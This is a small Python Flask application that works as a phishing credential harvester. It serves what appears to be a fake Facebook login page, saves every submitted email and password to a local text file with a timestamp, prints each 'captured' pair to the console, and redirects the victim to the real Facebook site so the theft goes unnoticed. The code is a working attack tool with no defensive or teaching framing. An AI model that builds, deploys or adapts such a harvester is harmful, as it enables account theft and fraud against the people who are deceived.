from flask import Flask, render_template, request , redirect
from datetime import datetime
import random
Current_New_Profile = str(random.randint(100000,1000000))
app = Flask(__name__)
def save_credentials(email, password):
    with open(f"{Current_New_Profile}user.txt", "+a") as file:
        file.write(f" {datetime.now()}Email: {email}, Password: {password}\n")
@app.route("/", methods=["GET", "POST"])
def home():
    if request.method == "POST":
        email = request.form.get("email")
        password = request.form.get("password")
        save_credentials(email, password)
        print(f"Captured Email or Username: {email}, Password: {password}")
        return redirect("https://web.facebook.com/?_rdc=1&_rdr#")
    return render_template("Fb.html")
if __name__ == "__main__":
    app.run(debug=True)
